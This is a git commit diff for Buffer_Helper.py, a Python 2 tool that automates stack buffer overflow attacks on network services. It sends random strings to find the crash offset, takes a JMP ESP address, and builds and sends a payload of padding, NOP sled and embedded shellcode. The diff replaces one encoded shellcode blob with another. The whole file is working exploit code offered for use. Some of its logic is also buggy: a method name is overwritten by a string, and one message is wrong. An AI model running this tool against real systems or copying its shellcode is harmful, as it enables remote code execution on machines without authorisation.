b8fd284f819d7b48b78d777123e67c900c03d3dc
jac11 <49693666+jac11@users.noreply.github.com>
2020-04-25 15:03:27 -0400

    Update Buffer_Helper.py

--- Buffer_Helper.py
+++ Buffer_Helper.py
@@ -1,8 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-
-
 import random
 import string
 import socket 
@@ -12,97 +10,135 @@ import readline
 class Buffer_Over:
      def __init__(self):
          self.Banner() 
+         self.ip_port()
          self.string_ramdon()
          self.connect_servser()
+         self.option_return()
          self.hexadecimal() 
          self.payload()
          self.little_endian()        
          self.attack_all()
-	 self.Banner()
-
+         self.Banner()
+         
+     def ip_port(self):
+       try:
+          self.server_ip=str(raw_input("\n[+]server ip : "))
+          time.sleep(2)
+          self.server_port=int(raw_input("\n[+]server port :")) 
+       except Exception:
+             print"\n[#]Please Check Ip and the Port [#]"  
+             return  self.ip_port()    
+       except KeyboardInterrupt:
+           self.Banner() 
+           exit()
      def string_ramdon(self):
          try:
-	 	 self.Requst_String = str(raw_input("\n[+]Enter your reguset:")).strip()
-		 self.length_String =len(self.Requst_String)
+	 	 self.Requst_String = int (raw_input("\n[+]Enter your reguset:"))
 		 time.sleep(2)
-		 print "\n[+]character length is :",self.length_String
-		 value = string.ascii_letters
-		 self.Random_String = "".join(random.choice(value)for i in range(self.length_String)).lower()  
+		 self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(self.Requst_String )).lower()  
                  self.Random_String = bytearray(self.Random_String)
-		 print "\n[+]Generated String is:",(self.Random_String).strip()
-		 print '\n[+]The New character length is:',len(self.Random_String )
+		 print "\n[+]String is Generated  length is:",len(self.Random_String ),"\n\n",(self.Random_String).strip()
+         except Exception:
+              time.sleep(2)
+              print "\n[()]check your input [()]"
+              return self.string_ramdon()		 
          except KeyboardInterrupt:
-                  print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
+                  self.Banner() 
                   exit()
  
      def connect_servser(self):
           while True:
 	        try:
 	            socket_1= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-		    self.server_ip=str(raw_input("\n[+]server ip : "))
-		    time.sleep(2)
-		    self.server_port=int(raw_input("\n[+]server port :"))
 		    socket_1.connect((self.server_ip,self.server_port))
 		    data = socket_1.recv(1023)
-		    socket_1.send( self.Random_String + '\r\n')
-		    time.sleep(2)
-	      	    print "\n[+]data send successful...!!!"
-		    socket_1.close()
-		    break
+		    if socket_1.send( self.Random_String + '\r\n'):
+		       time.sleep(2)
+	      	       print "\n[+]data send successful...!!!"
+		       socket_1.close()
+		       break 
 	        except Exception:
-		    print "\n[+]something goes wrong try again..!!**!! "
+	            time.sleep(2)
+	            print "\n[:::::'Connection Error :::::']"
+	            time.sleep(2)
+	            print"\n[#]Please check ip and the port [#]"
+		    self.ip_port()
+		    continue
                 except KeyboardInterrupt:
-                  print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
+                  self.Banner() 
                   exit()
-
+     def option_return(self):
+        try:
+             continue_1   = "c".lower()            
+             return_back  = "b".lower()
+             op_sel = str(raw_input("\n[<>]to continue press C  to back  press B: ")).lower()
+             if op_sel== continue_1 and  len(op_sel)==1:
+                pass
+             elif op_sel ==return_back and len(op_sel)==1:
+                  self.string_ramdon()
+                  self.connect_servser()
+                  self.option_return()
+             else:
+                  print"[-]\nplease Enter the C or B [-]" 
+                  self.option_return()
+        except KeyboardInterrupt:
+                  self.Banner() 
+                  exit()            
      def hexadecimal (self):                                                                           
           while True:
                  try: 
 		    self.hexadecimal = str(raw_input("\n[+]Enter hexadecimal Crach address: ")).upper()
                     self.ASCII1 ="".join(reversed([self.hexadecimal[i:i+2] for i in range(0, len(self.hexadecimal), 2)]))                
 		    self.ASCII = ''.join(chr(int(self.ASCII1[i:i+2], 16)) for i in range(0, len(self.ASCII1), 2))
-		    if self.ASCII in  self.Random_String:
-		       print "\n[+]The ASCII Value  is : ",self.ASCII
-		       time.sleep(2)
-		       self.location = self.Random_String.find(self.ASCII)
-		       
-		       print "\n[+]Exact satch at offset : ",self.location
-	               break
+		    if  self.ASCII in  self.Random_String and len(self.ASCII)==4:
+		        print "\n[+]The ASCII Value  is : ",self.ASCII
+		        time.sleep(2)
+		        self.location = self.Random_String.find(self.ASCII)
+		        print "\n[+]Exact satch at offset : ",self.location
+	                break
                     else:
-	               print "\n[+]WE NOT FOUNF THE VALUE IN OUR STRING  "
-	               self.hexadecimal = str(raw_input("\n[+]Enter hexadecimal Crach address : ")).upper()                 
-                 except Exception:
-		       print "\n[+]something goes wrong try again..!!**!! "
+	               print "\n[(*)]THE VALUE  OF THE ADDRESS FOUND  IN OUR STRING[(*)] "
+	               time.sleep(2)
+	               return self.hexadecimal()   
+	         except Exception:
+	           pass              
                  except KeyboardInterrupt:
-                      print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
+                      self.Banner() 
                       exit() 
      def payload(self):
          self.shellcode = (
-"\xda\xce\xbd\x38\xb0\x82\x43\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
-"\x56\x31\x6f\x18\x03\x6f\x18\x83\xc7\x3c\x52\x77\xbf\xd4\x10"
-"\x78\x40\x24\x75\xf0\xa5\x15\xb5\x66\xad\x05\x05\xec\xe3\xa9"
-"\xee\xa0\x17\x3a\x82\x6c\x17\x8b\x29\x4b\x16\x0c\x01\xaf\x39"
-"\x8e\x58\xfc\x99\xaf\x92\xf1\xd8\xe8\xcf\xf8\x89\xa1\x84\xaf"
-"\x3d\xc6\xd1\x73\xb5\x94\xf4\xf3\x2a\x6c\xf6\xd2\xfc\xe7\xa1"
-"\xf4\xff\x24\xda\xbc\xe7\x29\xe7\x77\x93\x99\x93\x89\x75\xd0"
-"\x5c\x25\xb8\xdd\xae\x37\xfc\xd9\x50\x42\xf4\x1a\xec\x55\xc3"
-"\x61\x2a\xd3\xd0\xc1\xb9\x43\x3d\xf0\x6e\x15\xb6\xfe\xdb\x51"
-"\x90\xe2\xda\xb6\xaa\x1e\x56\x39\x7d\x97\x2c\x1e\x59\xfc\xf7"
-"\x3f\xf8\x58\x59\x3f\x1a\x03\x06\xe5\x50\xa9\x53\x94\x3a\xa5"
-"\x90\x95\xc4\x35\xbf\xae\xb7\x07\x60\x05\x50\x2b\xe9\x83\xa7"
-"\x3a\xfd\x33\x77\x84\x6e\xca\x78\xf4\xa7\x09\x2c\xa4\xdf\xb8"             #PLEASE REPLACE THE SHELL CODE IN HERE  #
-"\x4d\x2f\x20\x44\x98\xc5\x2a\xd2\x29\xda\x4f\xc3\x46\xde\x8f"             
-"\x02\x2c\x57\x69\x54\x02\x37\x26\x15\xf2\xf7\x96\xfd\x18\xf8"              ######### # USE YOUR OWN CODE #######
-"\xc9\x1e\x23\xd3\x61\xb4\xcc\x8d\xda\x21\x74\x94\x91\xd0\x79"
-"\x03\xdc\xd3\xf2\xa1\x20\x9d\xf2\xc0\x32\xca\x64\x2a\xcb\x0b"
-"\x01\x2a\xa1\x0f\x83\x7d\x5d\x12\xf2\x49\xc2\xed\xd1\xca\x05"
-"\x11\xa4\xfa\x7e\x24\x32\x42\xe9\x49\xd2\x42\xe9\x1f\xb8\x42"
-"\x81\xc7\x98\x11\xb4\x07\x35\x06\x65\x92\xb6\x7e\xd9\x35\xdf"
-"\x7c\x04\x71\x40\x7f\x63\x01\x87\x7f\xf1\x2e\x20\x17\x09\x6f"
-"\xd0\xe7\x63\x6f\x80\x8f\x78\x40\x2f\x7f\x80\x4b\x78\x17\x0b"
-"\x1a\xca\x86\x0c\x37\x8a\x16\x0c\xb4\x17\xa9\x77\xb5\xa8\x4a"
-"\x88\xdf\xcc\x4b\x88\xdf\xf2\x70\x5e\xe6\x80\xb7\x62\x5d\x9a"
-"\x82\xc7\xf4\x31\xec\x54\x06\x10"
+"\xba\xec\x3d\xc8\x56\xdd\xc1\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
+"\x71\x31\x57\x13\x83\xc7\x04\x03\x57\xe3\xdf\x3d\x8f\x17\xc6"
+"\xca\x14\x13\x43\x05\x99\x47\x40\x32\x12\xbe\x18\xa9\x65\x10"
+"\x42\xad\x6e\x6c\x77\xe1\x7b\x59\x41\x46\xad\xa1\x04\x14\x8b"
+"\x8c\xe2\x8f\xac\x0f\xc8\xaa\x1b\xdf\xee\x82\xba\x57\x33\x3a"
+"\x60\x48\xd0\xe7\x54\xfb\x90\x92\x32\xaa\x5f\xb9\xe5\xec\xcf"
+"\x98\xa8\xaa\xa5\x8d\xbf\xaf\xd1\x33\xf7\x9c\x02\xc5\x77\xf9"
+"\xac\x52\xfa\x57\x6e\x15\x4d\x3c\x67\xa0\x04\xda\x9e\xdf\x17"
+"\xba\x18\xf2\xc9\xaa\x01\xf4\x77\xad\xc0\x95\xf0\xa1\xcc\x8c"
+"\x61\x05\x9b\x2d\x0f\xdb\xa7\x2f\x15\xfd\x5b\x8d\x10\xc1\xaa"
+"\x7f\x38\x81\xe7\xdf\xfb\xa0\x42\x32\x66\xcb\x71\x91\x12\x9c"
+"\x45\x04\xda\xf0\x15\x2b\x47\x0e\xf7\xeb\xd5\x62\x31\x77\x22"
+"\x5e\xc0\xb7\xb7\x1f\xd3\x2e\x10\xd9\x0f\x79\xa4\x75\xbb\x9a"
+"\x41\xe4\xb0\x1b\xc6\xf8\x9b\x6a\x09\xed\xad\x32\x8e\x2f\xb8"
+"\xf3\x9f\xf7\x90\x31\x46\x64\x7a\xbd\x61\x2f\x9b\xf4\x36\xf0"
+"\xc8\x2f\x0f\x21\xc7\x99\x23\xa8\xea\xef\xc1\x1e\x60\x8f\x96"
+"\xb3\xd9\xc7\x52\x0c\xc8\x51\xaa\x85\xb9\x07\x68\x08\x31\x7f"
+"\x0f\xaa\x83\x65\xb2\xe9\x2e\xaf\xa1\xbd\xc6\x1e\xaa\x42\x9f"
+"\x7f\x29\x80\x45\xc9\x2b\x0b\x22\x22\xc0\x59\x67\x08\x6e\x32"
+"\x12\xac\x55\x71\x62\xfc\x8a\xd2\x66\x01\x92\xfe\xa1\xc9\xe8"
+"\xd7\x94\x30\xb5\xcd\x24\x93\xf1\xe4\xf4\x18\x76\x57\x36\xe7"
+"\x99\xec\x69\x56\xcc\xb1\x2f\x5e\xf7\xe6\x99\x5a\x63\x45\x8f"
+"\x49\x70\xd5\x29\xbf\xd2\x55\x1b\x84\x68\x3e\xb5\x89\x4e\x32"
+"\x09\x45\xd5\x7b\x2a\x48\x1f\x07\xa7\xc1\x5e\x65\x67\xcf\x88"
+"\x15\xc2\x36\x88\xa0\xd8\x25\x65\xfb\x65\xdc\x0c\x9d\x4c\x05"
+"\x23\xc4\xc9\xfa\x9f\xcb\x6f\x3d\x8a\xd4\x7c\x99\x38\xa4\x95"
+"\x6e\x98\xe7\xac\xcc\xc6\x01\xa3\xfb\x3f\xb1\x64\xa4\xe9\xcf"
+"\x5f\x2d\x19\xfa\xc4\x97\x04\x33\x58\xf8\x61\xcf\x04\x51\x02"
+"\x3b\x3a\x18\xdd\x6c\xb9\x06\x93\x33\xe2\x77\x88\x05\xea\xf6"
+"\xe5\x2f\x85\xcb\xc2\x77\xea\xfa\xc1\xe4\x68\xef\x22\x45\x94"
+"\xc1\x81\x84\x34\x97\x2d\xb7\x51\x82\x41\x49\x1a\x37\x92\x95"
+"\xad\xde\x73\xc7\x5f\x08\x2b\x96\x44\x5c\x93"
                           )
          
          
@@ -117,16 +153,15 @@ class Buffer_Over:
                 self.jump_address = ('0'*(len(self.jump_address) % 2) +self.jump_address).decode('hex') 
                 print "\n[+]little endian JMP ESP  is : ", self.display
              except KeyboardInterrupt:
-                print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
+                self.Banner() 
                 exit()
              
      def attack_all(self):
-          while True:
 	       try: 
                                   
                    socket_2 =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    Start_string = self.location*"A"        
-                   NO_Operation = len(self.Requst_String) - self.location  - len( self.jump_address) 
+                   NO_Operation = len(self.Random_String) - self.location  - len( self.jump_address) 
                    NO_Operation = NO_Operation*"\x90"   
                    attack = Start_string+self.jump_address+ NO_Operation +self.shellcode 
                    print '\n[+] attack =',len(Start_string),'of "A" + JMP ESP =', self.display ,'+',NO_Operation.count("\x90"),'of("\\x90") '" + shell code"
@@ -137,20 +172,22 @@ class Buffer_Over:
                    socket_2.connect((self.server_ip,self.server_port))
                    print "\n[+]WE READY TO ATTACK !![+]"  
                    data_recv  = socket_2.recv(1024)
-                   socket_2.send( attack + '\r\n')
-                   time.sleep(2)
-	           print "\n[+]data send successful...!!!"
-                   socket_2.close()
-                   print "\n[+]-------------------------{THANK YOU}--------------------------[+]"              
-                                                      
-	           break	
-               except Exception:
-		   print "\n[+]something goes wrong try again..!!**!!" 
-                   stop = str(raw_input("\n[+]Enter any key to connect ???"))
+                   if socket_2.send( attack + '\r\n'):
+                        time.sleep(2)
+	                print "\n[+]data send successful...!!!"
+                        socket_2.close()
+                        self.Banner() 
+                        exit() 
+               except socket.error, exc:
+                          time.sleep(3)
+                          print "\n[(!)]Caught exception socket.error : %s\n" % exc
+                          time.sleep(2) 
+                          self.Banner()                                   	
+                          exit()
                except KeyboardInterrupt:
-                  print "\n\n[+]-------------------------{GOOD BYE}--------------------------[+]"
+                  self.Banner() 
                   exit()
-                  
+                          
      def Banner(self):
            print"""
  ____         __  __             _   _      _                  
